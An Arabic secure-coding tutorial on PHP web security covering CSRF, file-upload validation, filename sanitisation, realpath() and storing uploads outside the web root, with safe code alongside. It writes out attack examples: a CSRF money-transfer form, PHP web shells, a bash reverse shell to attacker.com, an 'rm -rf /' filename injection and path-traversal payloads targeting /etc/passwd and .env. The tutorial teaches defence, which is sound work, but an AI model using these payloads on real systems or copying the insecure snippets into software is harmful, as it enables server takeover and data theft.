## 1. ماذا لو لم تستخدم CSRF Token؟

**العواقب**:

- يصبح التطبيق عرضة لهجمات CSRF الكاملة
    
- يمكن للمهاجمين تنفيذ أي إجراء مسموح به للمستخدم
    
- لا يحمي سمة SameSite وحدها تماماً (بعض المتصفحات القديمة)
    

**مثال حقيقي**:

html

<!-- صفحة المهاجم على موقع ضار -->
<form action="https://bank.com/transfer" method="POST" id="csrfForm">
  <input type="hidden" name="amount" value="5000">
  <input type="hidden" name="toAccount" value="ATTACKER123">
</form>

<script>
// يمكن للمهاجم إخفاء الهجوم بعدة طرق:
// 1. في iframe غير مرئي
// 2. كصورة (باستخدام GET)
// 3. عبر redirect بعد النقر على رابط
document.getElementById('csrfForm').submit();
</script>

**سيناريو كامل**:

1. المستخدم يسجل الدخول إلى البنك الإلكتروني
    
2. يزور موقعاً آخر يحتوي على الكود أعلاه
    
3. يتم تحويل 5000 دولار بدون علمه
    
4. لا يوجد أي سجل للمهاجم لأنه استخدم جلسة المستخدم
    

## 2. ماذا لو قبلت أي امتداد؟

**العواقب**:

- إمكانية رفع ملفات تنفيذية مباشرة
    
- تجاوز كامل للحماية إذا كان الخادم ينفذ بناءً على الامتداد
    
- انتشار البرمجيات الخبيثة عبر الموقع
    

**أمثلة على الامتدادات الخطيرة**:

text

.php, .php3, .php4, .php5, .php7, .phtml
.jsp, .jspx, .war
.asp, .aspx
.py, .pl, .sh
.exe, .bat, .cmd
.html, .htm (قد تحتوي على JavaScript خبيث)

**مثال عملي**:

php

// كود غير آمن تماماً
if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
    move_uploaded_file(
        $_FILES['file']['tmp_name'],
        'uploads/' . $_FILES['file']['name']
    );
    echo "تم رفع الملف بنجاح!";
}

**هجوم ممكن**:

1. المهاجم يرفع `shell.php`:
    

php

<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo system('id');
}
?>

2. الوصول للشيل: `https://site.com/uploads/shell.php?cmd=ls -la`
    
3. التصعيد للحصول على reverse shell:
    

bash

# في shell.php?cmd=
bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'

## 3. ماذا لو حفظت الملف باسمه الأصلي؟

**المخاطر**:

1. **تجاوز الملفات**: `../../../etc/passwd`
    
2. **حقن المسارات**: `filename../../shell.php`
    
3. **تضارب الأسماء**: استبدال ملفات مهمة
    
4. **حقن الأوامر**: أسماء الملفات تحتوي على `; rm -rf /`
    

**مثال على الهجوم**:

php

// الكود الخطر
$fileName = $_FILES['file']['name'];
$targetPath = "uploads/" . $fileName;

move_uploaded_file($_FILES['file']['tmp_name'], $targetPath);

**هجمات ممكنة**:

bash

# 1. Path traversal مباشر
اسم الملف: "../../../var/www/html/index.php"

# 2. حقن null byte (في أنظمة قديمة)
اسم الملف: "shell.php\0.jpg"

# 3. استغلال case sensitivity (في Windows)
اسم الملف: "CON" أو "AUX" (أسماء محجوزة)

# 4. أسماء طويلة تسبب buffer overflow
اسم الملف: "A" × 10000 + ".php"

# 5. حقن HTML/JavaScript
اسم الملف: "<script>alert('xss')</script>.jpg"

**سيناريو واقعي**:

1. الموقع: متجر إلكتروني يسمح برفع صور المنتجات
    
2. الثغرة: يقبل أي اسم ملف دون تعقيم
    
3. الهجوم: `../../includes/config.php`
    
4. النتيجة: استبدال ملف التكوين الرئيسي بكود خبيث
    

## 4. ماذا لو تجاهلت realpath()؟

**المخاطر المباشرة**:

1. **Path Traversal غير المقيد**
    
2. **قراءة ملفات النظام الحساسة**
    
3. **كتابة في مجلدات نظام**
    

**مقارنة بين الكود الآمن وغير الآمن**:

php

// ⚠️ غير آمن - يتجاهل realpath()
$userInput = $_GET['file'];
$filePath = "uploads/" . $userInput;

// يمكن للمهاجم الوصول لأي ملف
// مثال: ?file=../../../etc/passwd
readfile($filePath);

// ✅ آمن - يستخدم realpath()
$baseDir = realpath("uploads/");
$userInput = $_GET['file'];
$requestedPath = realpath($baseDir . '/' . $userInput);

// التحقق من أن المسار ضمن المجلد المسموح
if ($requestedPath && strpos($requestedPath, $baseDir) === 0) {
    readfile($requestedPath);
} else {
    die("مسار غير مسموح!");
}

**هجمات ممكنة بدون realpath()**:

bash

# 1. قراءة ملفات النظام
?file=../../../../etc/passwd
?file=../../../../etc/shadow
?file=../../../../proc/self/environ

# 2. قراءة ملفات التطبيق
?file=../config/database.php
?file=../.env
?file=../.htaccess

# 3. تجاوز الرموز (Symbolic Links)
# إذا كان هناك symbolic link في uploads/
?file=malicious_link/../../../etc/passwd

# 4. استخدام encoding مختلف
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL encoded
?file=....//....//etc/passwd          # Double dots

## 5. ماذا لو وضعت uploads داخل public؟

**المخاطر**:

1. **وصول مباشر للملفات المنفذة**
    
2. **عدم القدرة على التحكم في تنفيذ الملفات**
    
3. **تجاوز فلاتر Apache/nginx**
    

**مقارنة بين الهيكلين**:

bash

# ❌ هيكل خطر - uploads داخل public
/var/www/html/              # جذر الويب (public)
├── index.php
├── uploads/                # يمكن الوصول مباشرة
│   ├── image.jpg
│   └── shell.php          # يمكن تنفيذه عبر browser!
└── includes/
    └── config.php

# ✅ هيكل آمن - uploads خارج public
/var/www/
├── html/                  # جذر الويب فقط
│   ├── index.php
│   └── download.php      # يتحكم في عرض الملفات
└── uploads/              # خارج جذر الويب
    ├── image.jpg
    └── shell.php         # لا يمكن الوصول مباشرة

**مثال على الكود الخطر**:

php

// ملف upload.php
move_uploaded_file(
    $_FILES['file']['tmp_name'],
    $_SERVER['DOCUMENT_ROOT'] . '/uploads/' . $filename
);
// الآن يمكن الوصول: https://site.com/uploads/shell.php

**مثال على الحل الآمن**:

php

// تخزين خارج document root
define('UPLOAD_DIR', '/var/www/private_uploads/');

// وظيفة لعرض الملفات بشكل آمن
function serveFile($filename) {
    $path = realpath(UPLOAD_DIR . $filename);
    $allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $path);
    
    if (!in_array($mime, $allowedTypes)) {
        die('نوع ملف غير مسموح');
    }
    
    header('Content-Type: ' . $mime);
    readfile($path);
}

**سيناريو اختراق كامل**:

1. الموقع: منتدى يسمح برفع الصور
    
2. الهيكل: `public_html/uploads/`
    
3. الثغرة: يقبل ملفات `.php` كصور
    
4. الهجوم:
    
    php
    
    // shell.php
    <?php
    if(isset($_POST['pass']) && $_POST['pass'] == 'hacker123') {
        eval($_POST['cmd']);
    }
    ?>
    
5. الوصول: `https://forum.com/uploads/shell.php`
    
6. التحكم الكامل في الخادم
    

---

## التوصيات النهائية:

1. **استخدم CSRF tokens دائماً** حتى مع SameSite cookies
    
2. **اقصر أنواع الملفات المسموحة** على الضروري فقط
    
3. **أعد تسمية الملفات** باستخدام hash أو ID عشوائي
    
4. **استخدم realpath() دائماً** مع التحقق من البداية
    
5. **خزن الملفات خارج جذر الويب** وقدمها عبر script وسيط
    
6. **فعل Content-Type من الملف نفسه** (باستخدام finfo)
    
7. **ضع حجماً أقصى للملفات** لمنع حجب الخدمة
    
8. **عطل تنفيذ PHP في مجلدات التحميل**:
    
    apache
    
    <Directory "/var/www/uploads">
        php_flag engine off
        RemoveHandler .php
    </Directory>